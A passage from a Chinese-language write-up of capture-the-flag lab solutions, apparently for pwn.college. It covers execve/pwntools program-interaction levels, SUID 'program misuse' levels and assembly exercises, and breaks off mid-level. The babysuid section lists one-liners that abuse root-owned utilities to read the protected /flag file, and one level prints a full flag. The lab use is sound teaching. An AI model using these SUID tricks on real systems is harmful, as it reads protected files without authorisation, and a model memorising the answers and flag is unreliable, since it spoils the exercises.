</span></span><span class=line><span class=cl><span class=n>execve</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>argv</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span></code></pre></div><h3 id=69 class="relative group">69 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#69 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=n>execve</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span></code></pre></div><h3 id=70 class="relative group">70 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#70 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=kt>char</span> <span class=o>*</span><span class=n>env</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=s>&#34;146=sdzbeolria&#34;</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=n>execve</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>env</span><span class=p>);</span>
</span></span></code></pre></div><h3 id=71 class="relative group">71 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#71 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=kt>int</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=o>*</span><span class=n>env</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=s>&#34;254=xeqznkovla&#34;</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[</span><span class=mi>100</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>binary</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>77</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>argv</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=s>&#34;dummy&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>argv</span><span class=p>[</span><span class=mi>77</span><span class=p>]</span> <span class=o>=</span> <span class=s>&#34;balycwokzx&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>argv</span><span class=p>[</span><span class=mi>78</span><span class=p>]</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>execve</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>argv</span><span class=p>,</span> <span class=n>env</span><span class=p>);</span>
</span></span></code></pre></div><h3 id=72 class="relative group">72 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#72 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=nb>cd</span> /tmp/ehpfci
</span></span><span class=line><span class=cl>/challenge/<span class=nv>$HOSTNAME</span> &lt; jysqyp
</span></span></code></pre></div><h3 id=73 class="relative group">73 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#73 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>bash -c <span class=s1>&#39;cd /tmp/wvliga &amp;&amp; /challenge/$HOSTNAME&#39;</span>
</span></span></code></pre></div><h3 id=74 class="relative group">74 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#74 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/challenge/</span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;HOSTNAME&#34;</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>binary</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>args</span> <span class=o>=</span> <span class=p>[</span><span class=n>binary</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>41</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>args</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s2>&#34;gmphbjwhvy&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>args</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><h2 id=babysuid-program-misuse class="relative group">babysuid: Program Misuse <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#babysuid-program-misuse aria-label=锚点>#</a></span></h2><h3 id=1-9 class="relative group">1-9 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#1-9 aria-label=锚点>#</a></span></h3><p><code>[command]</code> 指题目中拥有 root 权限的程序名。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ <span class=o>[</span>command<span class=o>]</span> /flag
</span></span></code></pre></div><h3 id=10 class="relative group">10 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#10 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ rev /flag <span class=p>|</span> rev
</span></span></code></pre></div><h3 id=11 class="relative group">11 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#11 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ od -w1000 -c /flag
</span></span><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s1>&#39;p   w   n   .   c   o   l   l   e   g   e   {   s   C   G   -   E   C   B   Z   N   9   x   _   p   W   C   f   M   j   -   T   4   i   1   L   V   D   H   .   Q   X   z   U   T   M   s   A   T   O   4   I   z   W   }&#39;</span> <span class=p>|</span> sed <span class=s1>&#39;s/ //g&#39;</span>
</span></span></code></pre></div><h3 id=12 class="relative group">12 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#12 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ hd /flag
</span></span></code></pre></div><h3 id=13 class="relative group">13 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#13 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ xxd -c <span class=m>100</span> /flag
</span></span></code></pre></div><h3 id=14 class="relative group">14 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#14 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ base32 /flag <span class=p>|</span> base32 -d
</span></span></code></pre></div><h3 id=15-1 class="relative group">15 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#15-1 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ base64 /flag <span class=p>|</span> base64 -d
</span></span></code></pre></div><h3 id=16-1 class="relative group">16 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#16-1 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ split /flag
</span></span><span class=line><span class=cl>$ cat xaa
</span></span></code></pre></div><h3 id=17-1 class="relative group">17 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#17-1 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ gzip -k /flag
</span></span><span class=line><span class=cl>$ gzip -d /flag.gz -c
</span></span></code></pre></div><h3 id=18-1 class="relative group">18 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#18-1 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ bzip2 -k /flag
</span></span><span class=line><span class=cl>$ bzip2 -d /flag.bz2 -c
</span></span></code></pre></div><h3 id=19-1 class="relative group">19 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#19-1 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ zip flag.zip /flag
</span></span><span class=line><span class=cl>$ unzip flag.zip
</span></span><span class=line><span class=cl>$ cat flag
</span></span></code></pre></div><h3 id=20-1 class="relative group">20 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#20-1 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ tar -cf flag.tar /flag
</span></span><span class=line><span class=cl>$ tar -xf flag.tar -O
</span></span></code></pre></div><h3 id=21-1 class="relative group">21 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#21-1 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ ar r flag.bak /flag
</span></span><span class=line><span class=cl>$ ar p flag.bak
</span></span></code></pre></div><h2 id=embryoasm-assembly-refresher class="relative group">embryoasm: Assembly Refresher <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#embryoasm-assembly-refresher aria-label=锚点>#</a></span></h2><p>模版：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>assembly</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>TODO
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/challenge/</span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;HOSTNAME&#34;</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>binary</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>binary</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>assembly</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><h3 id=1-1 class="relative group">1 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#1-1 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>mov</span> <span class=no>rdi</span><span class=p>,</span> <span class=mi>0x1337</span>
</span></span></code></pre></div><h3 id=2-1 class="relative group">2 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#2-1 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>add</span> <span class=no>rdi</span><span class=p>,</span> <span class=mi>0x331337</span>
</span></span></code></pre></div><h3 id=3-1 class="relative group">3 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#3-1 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>imul</span> <span class=no>rdi</span><span class=p>,</span> <span class=no>rsi</span>
</span></span><span class=line><span class=cl><span class=nf>add</span> <span class=no>rdi</span><span class=p>,</span> <span class=no>rdx</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>rax</span><span class=p>,</span> <span class=no>rdi</span>
</span></span></code></pre></div><h3 id=4-1 class="relative group">4 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#4-1 aria-label=锚点>#</a></span></h3><p><code>div</code> 默认 <code>rax</code> 为被除数，商放到 <code>rax</code>，余数放到 <code>rdx</code>。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>mov</span> <span class=no>rax</span><span class=p>,</span> <span class=no>rdi</span>
</span></span><span class=line><span class=cl><span class=nf>div</span> <span class=no>rsi</span>
</span></span></code></pre></div><h3 id=5-1 class="relative group">5 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#5-1 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>mov</span> <span class=no>rax</span><span class=p>,</span> <span class=no>rdi</span>
</span></span><span class=line><span class=cl><span class=nf>div</span> <span class=no>rsi</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>rax</span><span class=p>,</span> <span class=no>rdx</span>
</span></span></code></pre></div><h3 id=6-1 class="relative group">6 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#6-1 aria-label=锚点>#</a></span></h3><ul><li>rax, eax, ax, (ah | al)</li><li>rbx, ebx, bx, (bh | bl)</li><li>rdi, edi, di, (dih | dil)</li><li>rsi, esi, si, (sih | sil)</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>mov</span> <span class=no>al</span><span class=p>,</span> <span class=no>dil</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>bx</span><span class=p>,</span> <span class=no>si</span>
</span></span></code></pre></div><h3 id=7-1 class="relative group">7 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#7-1 aria-label=锚点>#</a></span></h3><p>注意字节和 bit 转换。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>shl</span> <span class=no>rdi</span><span class=p>,</span> <span class=mi>32</span>
</span></span><span class=line><span class=cl><span class=nf>shr</span> <span class=no>rdi</span><span class=p>,</span> <span class=mi>56</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>rax</span><span class=p>,</span> <span class=no>rdi</span>
</span></span></code></pre></div><h3 id=8-1 class="relative group">8 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#8-1 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>and</span> <span class=no>rdi</span><span class=p>,</span> <span class=no>rsi</span>
</span></span><span class=line><span class=cl><span class=nf>xor</span> <span class=no>rax</span><span class=p>,</span> <span class=no>rax</span>
</span></span><span class=line><span class=cl><span class=nf>or</span> <span class=no>rax</span><span class=p>,</span> <span class=no>rdi</span>
</span></span></code></pre></div><h3 id=9 class="relative group">9 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#9 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>and</span> <span class=no>rdi</span><span class=p>,</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=nf>xor</span> <span class=no>rdi</span><span class=p>,</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=nf>xor</span> <span class=no>rax</span><span class=p>,</span> <span class=no>rax</span>
</span></span><span class=line><span class=cl><span class=nf>or</span> <span class=no>rax</span><span class=p>,</span> <span class=no>rdi</span>
</span></span></code></pre></div><h3 id=10-1 class="relative group">10 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#10-1 aria-label=锚点>#</a></span></h3><p>注意 <code>add</code> 指令中，被加数的 <code>QWORD PTR</code> 不可省略。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>mov</span> <span class=no>rax</span><span class=p>,</span> <span class=no>QWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=mi>0x404000</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nf>add</span> <span class=no>QWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=mi>0x404000</span><span class=p>],</span><span class=mi>0x1337</span>
</span></span></code></pre></div><h3 id=11-1 class="relative group">11 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#11-1 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>mov</span> <span class=no>al</span><span class=p>,</span> <span class=no>BYTE</span> <span class=no>PTR</span> <span class=p>[</span><span class=mi>0x404000</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>bx</span><span class=p>,</span> <span class=no>WORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=mi>0x404000</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>ecx</span><span class=p>,</span> <span class=no>DWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=mi>0x404000</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>rdx</span><span class=p>,</span> <span class=no>QWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=mi>0x404000</span><span class=p>]</span>
</span></span></code></pre></div><h3 id=12-1 class="relative group">12 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#12-1 aria-label=锚点>#</a></span></h3><p>长度较长的数字先放寄存器再赋值。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>mov</span> <span class=no>rbx</span><span class=p>,</span><span class=mi>0xdeadbeef00001337</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=p>[</span><span class=no>rdi</span><span class=p>],</span> <span class=no>rbx</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>rcx</span><span class=p>,</span> <span class=mi>0x000000c0ffee0000</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=p>[</span><span class=no>rsi</span><span class=p>],</span><span class=no>rcx</span>
</span></span></code></pre></div><h3 id=13-1 class="relative group">13 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#13-1 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>mov</span> <span class=no>rax</span><span class=p>,</span> <span class=no>QWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rdi</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>rbx</span><span class=p>,</span> <span class=no>QWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rdi</span><span class=err>+</span><span class=mi>8</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nf>add</span> <span class=no>rax</span><span class=p>,</span> <span class=no>rbx</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=p>[</span><span class=no>rsi</span><span class=p>],</span> <span class=no>rax</span>
</span></span></code></pre></div><h3 id=14-1 class="relative group">14 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#14-1 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>pop</span> <span class=no>rax</span>
</span></span><span class=line><span class=cl><span class=nf>sub</span> <span class=no>rax</span><span class=p>,</span> <span class=no>rdi</span>
</span></span><span class=line><span class=cl><span class=nf>push</span> <span class=no>rax</span>
</span></span></code></pre></div><h3 id=15-2 class="relative group">15 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#15-2 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>push</span> <span class=no>rdi</span>
</span></span><span class=line><span class=cl><span class=nf>push</span> <span class=no>rsi</span>
</span></span><span class=line><span class=cl><span class=nf>pop</span> <span class=no>rdi</span>
</span></span><span class=line><span class=cl><span class=nf>pop</span> <span class=no>rsi</span>
</span></span></code></pre></div><h3 id=16-2 class="relative group">16 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#16-2 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>mov</span> <span class=no>rax</span><span class=p>,</span> <span class=p>[</span><span class=no>rsp</span><span class=err>+</span><span class=mi>24</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nf>add</span> <span class=no>rax</span><span class=p>,</span> <span class=p>[</span><span class=no>rsp</span><span class=err>+</span><span class=mi>16</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nf>add</span> <span class=no>rax</span><span class=p>,</span> <span class=p>[</span><span class=no>rsp</span><span class=err>+</span><span class=mi>8</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nf>add</span> <span class=no>rax</span><span class=p>,</span> <span class=p>[</span><span class=no>rsp</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>rbx</span><span class=p>,</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl><span class=nf>div</span> <span class=no>rbx</span>
</span></span><span class=line><span class=cl><span class=nf>push</span> <span class=no>rax</span>
</span></span></code></pre></div><h3 id=17-2 class="relative group">17 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#17-2 aria-label=锚点>#</a></span></h3><p>中间有 0x51 个 nop，实际上跳了 0x53。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>jmp</span> <span class=no>.L2</span>
</span></span><span class=line><span class=cl><span class=na>.rept</span> <span class=mi>0x51</span>
</span></span><span class=line><span class=cl><span class=nf>nop</span>
</span></span><span class=line><span class=cl><span class=na>.endr</span>
</span></span><span class=line><span class=cl><span class=nl>.L2:</span>
</span></span><span class=line><span class=cl><span class=nf>pop</span> <span class=no>rdi</span>
